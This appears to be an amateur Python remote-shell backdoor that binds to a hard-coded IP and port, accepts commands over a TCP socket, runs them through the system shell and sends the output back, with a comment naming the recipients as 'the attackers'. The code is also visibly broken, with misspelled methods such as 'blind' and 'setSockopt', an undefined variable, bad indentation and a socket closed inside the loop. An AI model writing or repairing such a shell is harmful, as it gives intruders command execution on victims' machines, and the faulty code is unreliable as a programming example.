import socket
import subprocess,os

HOST="132.67.1.72"
PORT=1234

connexion_socket =socket.socket(socket.AF_INET,socket.SOCK_STREAM)#creaes server tcp
connexion_socket.setSockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1)#prevents from getting timeout issues
connexion_socket.blind((HOST,PORT))

while True:

    command=connexion_socket.recv(1024)
    if(command=="quit"):
    break

    #dealing with a command that does not work with subprocess.popen()
    if(command.split()[0]=="cd"):
        #command.split takes the second word typed(=the directory we want to move to)
        os.chdir(command.split()[1])
        connexcion_socket.send(("changed directory to"+os.getcwd()))

    else:
        #executes comand line,making sure to get the output(more details about subprocess.popen()in python doc)
        shell_execution=subprocess.popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdout_value=proc.stdout.read()+proc.stderr.read() #retrives command output
        connexion_socket.send(stdout_value) #sends the output back to the attackers
        connexion_socket.close()
